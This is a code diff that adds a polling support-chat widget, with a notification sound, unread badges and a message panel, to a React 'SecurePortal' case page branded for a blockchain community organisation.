@@ -1,11 +1,12 @@
-import React, { useState, useEffect } from "react";
+import React, { useState, useEffect, useRef } from "react";
 import { Button } from "@/components/ui/button";
 import { Card, CardContent, CardFooter, CardHeader, CardTitle } from "@/components/ui/card";
 import { Dialog, DialogContent, DialogDescription, DialogFooter, DialogHeader, DialogTitle } from "@/components/ui/dialog";
 import { Input } from "@/components/ui/input";
 import { Badge } from "@/components/ui/badge";
-import { ShieldCheck, Lock, CheckCircle2, Key, User, Mail, Phone, FolderOpen, FileText, History, ArrowLeft } from "lucide-react";
-import { motion } from "framer-motion";
+import { ScrollArea } from "@/components/ui/scroll-area";
+import { ShieldCheck, Lock, CheckCircle2, Key, User, Mail, Phone, FolderOpen, FileText, History, ArrowLeft, MessageCircle, Send, X } from "lucide-react";
+import { motion, AnimatePresence } from "framer-motion";
 import ibcLogo from "@assets/generated_images/professional_corporate_logo_for_international_blockchain_community.png";
 import { useToast } from "@/hooks/use-toast";
 
@@ -46,6 +47,34 @@ interface Submission {
   submittedAt: string;
 }
 
+interface ChatMessage {
+  id: number;
+  caseId: string;
+  sender: 'admin' | 'user';
+  message: string;
+  isRead: string;
+  createdAt: string;
+}
+
+const playNotificationSound = () => {
+  const audioContext = new (window.AudioContext || (window as any).webkitAudioContext)();
+  const oscillator = audioContext.createOscillator();
+  const gainNode = audioContext.createGain();
+  
+  oscillator.connect(gainNode);
+  gainNode.connect(audioContext.destination);
+  
+  oscillator.frequency.setValueAtTime(800, audioContext.currentTime);
+  oscillator.frequency.setValueAtTime(600, audioContext.currentTime + 0.1);
+  oscillator.frequency.setValueAtTime(800, audioContext.currentTime + 0.2);
+  
+  gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
+  gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.3);
+  
+  oscillator.start(audioContext.currentTime);
+  oscillator.stop(audioContext.currentTime + 0.3);
+};
+
 export default function SecurePortal() {
   const [viewState, setViewState] = useState<'login' | 'register' | 'sync' | 'letter' | 'submissions' | 'success'>('login');
   
@@ -64,6 +93,14 @@ export default function SecurePortal() {
   const [selectedOption, setSelectedOption] = useState<"A" | "B" | null>(null);
   const [isConfirming, setIsConfirming] = useState(false);
   const [isSubmitting, setIsSubmitting] = useState(false);
+  
+  const [isChatOpen, setIsChatOpen] = useState(false);
+  const [chatMessages, setChatMessages] = useState<ChatMessage[]>([]);
+  const [newMessage, setNewMessage] = useState("");
+  const [unreadCount, setUnreadCount] = useState(0);
+  const [isSendingMessage, setIsSendingMessage] = useState(false);
+  const chatScrollRef = useRef<HTMLDivElement>(null);
+  const lastMessageCountRef = useRef(0);
   
   const { toast } = useToast();
 
@@ -128,6 +165,79 @@ export default function SecurePortal() {
     } catch (error) {
       console.error('Failed to load data:', error);
     }
+  };
+
+  // Chat message polling
+  useEffect(() => {
+    if (!currentCase || viewState === 'login' || viewState === 'register') return;
+
+    const pollMessages = async () => {
+      try {
+        const res = await fetch(`/api/cases/${currentCase.id}/messages`);
+        if (res.ok) {
+          const messages = await res.json();
+          setChatMessages(messages);
+          
+          const adminMessages = messages.filter((m: ChatMessage) => m.sender === 'admin' && m.isRead === 'false');
+          setUnreadCount(adminMessages.length);
+          
+          if (messages.length > lastMessageCountRef.current) {
+            const latestMessage = messages[messages.length - 1];
+            if (latestMessage.sender === 'admin' && !isChatOpen) {
+              playNotificationSound();
+              toast({ title: "New Message", description: "You have a new message from support." });
+            }
+          }
+          lastMessageCountRef.current = messages.length;
+        }
+      } catch (error) {
+        console.error('Failed to poll messages:', error);
+      }
+    };
+
+    pollMessages();
+    const interval = setInterval(pollMessages, 3000);
+    return () => clearInterval(interval);
+  }, [currentCase, viewState, isChatOpen, toast]);
+
+  // Scroll to bottom when chat opens or new message
+  useEffect(() => {
+    if (chatScrollRef.current) {
+      chatScrollRef.current.scrollTop = chatScrollRef.current.scrollHeight;
+    }
+  }, [chatMessages, isChatOpen]);
+
+  // Mark messages as read when chat opens
+  useEffect(() => {
+    if (isChatOpen && currentCase && unreadCount > 0) {
+      fetch(`/api/cases/${currentCase.id}/messages/read`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ sender: 'admin' })
+      }).then(() => setUnreadCount(0));
+    }
+  }, [isChatOpen, currentCase, unreadCount]);
+
+  const sendMessage = async () => {
+    if (!newMessage.trim() || !currentCase || isSendingMessage) return;
+    
+    setIsSendingMessage(true);
+    try {
+      const res = await fetch(`/api/cases/${currentCase.id}/messages`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ sender: 'user', message: newMessage.trim() })
+      });
+      
+      if (res.ok) {
+        const msg = await res.json();
+        setChatMessages(prev => [...prev, msg]);
+        setNewMessage("");
+      }
+    } catch (error) {
+      toast({ variant: "destructive", title: "Error", description: "Failed to send message." });
+    }
+    setIsSendingMessage(false);
   };
 
   // Polling for sync status
@@ -729,6 +839,109 @@ export default function SecurePortal() {
           </DialogFooter>
         </DialogContent>
       </Dialog>
+
+      {/* Floating Chat Button */}
+      {currentCase && viewState !== 'login' && viewState !== 'register' && (
+        <motion.div
+          className="fixed bottom-6 right-6 z-50"
+          initial={{ scale: 0 }}
+          animate={{ scale: 1 }}
+          transition={{ type: "spring", stiffness: 260, damping: 20 }}
+        >
+          <Button
+            onClick={() => setIsChatOpen(true)}
+            className="h-14 w-14 rounded-full shadow-lg bg-blue-600 hover:bg-blue-700 relative"
+            data-testid="button-open-chat"
+          >
+            <MessageCircle className="h-6 w-6" />
+            {unreadCount > 0 && (
+              <span className="absolute -top-1 -right-1 h-5 w-5 rounded-full bg-red-500 text-xs text-white flex items-center justify-center font-bold animate-pulse">
+                {unreadCount}
+              </span>
+            )}
+          </Button>
+        </motion.div>
+      )}
+
+      {/* Chat Box */}
+      <AnimatePresence>
+        {isChatOpen && currentCase && (
+          <motion.div
+            initial={{ opacity: 0, y: 100 }}
+            animate={{ opacity: 1, y: 0 }}
+            exit={{ opacity: 0, y: 100 }}
+            className="fixed bottom-6 right-6 z-50 w-80 sm:w-96 h-[500px] bg-white rounded-lg shadow-2xl border border-slate-200 flex flex-col overflow-hidden"
+          >
+            <div className="bg-blue-600 text-white px-4 py-3 flex justify-between items-center">
+              <div className="flex items-center gap-2">
+                <MessageCircle className="h-5 w-5" />
+                <span className="font-semibold">IBC Support</span>
+              </div>
+              <Button
+                variant="ghost"
+                size="sm"
+                className="h-8 w-8 p-0 text-white hover:bg-blue-700"
+                onClick={() => setIsChatOpen(false)}
+                data-testid="button-close-chat"
+              >
+                <X className="h-4 w-4" />
+              </Button>
+            </div>
+            
+            <div ref={chatScrollRef} className="flex-1 overflow-y-auto p-4 space-y-3 bg-slate-50">
+              {chatMessages.length === 0 ? (
+                <div className="text-center text-slate-500 mt-8">
+                  <MessageCircle className="h-12 w-12 mx-auto text-slate-300 mb-3" />
+                  <p className="text-sm">No messages yet. Start a conversation with support.</p>
+                </div>
+              ) : (
+                chatMessages.map((msg) => (
+                  <div
+                    key={msg.id}
+                    className={`flex ${msg.sender === 'user' ? 'justify-end' : 'justify-start'}`}
+                  >
+                    <div
+                      className={`max-w-[80%] px-4 py-2 rounded-2xl ${
+                        msg.sender === 'user'
+                          ? 'bg-blue-600 text-white rounded-br-md'
+                          : 'bg-white text-slate-800 border border-slate-200 rounded-bl-md'
+                      }`}
+                    >
+                      <p className="text-sm whitespace-pre-wrap">{msg.message}</p>
+                      <p className={`text-xs mt-1 ${msg.sender === 'user' ? 'text-blue-100' : 'text-slate-400'}`}>
+                        {new Date(msg.createdAt).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
+                      </p>
+                    </div>
+                  </div>
+                ))
+              )}
+            </div>
+            
+            <div className="p-3 border-t border-slate-200 bg-white">
+              <div className="flex gap-2">
+                <Input
+                  placeholder="Type your message..."
+                  value={newMessage}
+                  onChange={(e) => setNewMessage(e.target.value)}
+                  onKeyDown={(e) => e.key === 'Enter' && !e.shiftKey && sendMessage()}
+                  disabled={isSendingMessage}
+                  className="flex-1"
+                  data-testid="input-chat-message"
+                />
+                <Button
+                  onClick={sendMessage}
+                  disabled={!newMessage.trim() || isSendingMessage}
+                  size="sm"
+                  className="bg-blue-600 hover:bg-blue-700"
+                  data-testid="button-send-message"
+                >
+                  <Send className="h-4 w-4" />
+                </Button>
+              </div>
+            </div>
+          </motion.div>
+        )}
+      </AnimatePresence>
     </div>
   );
 }
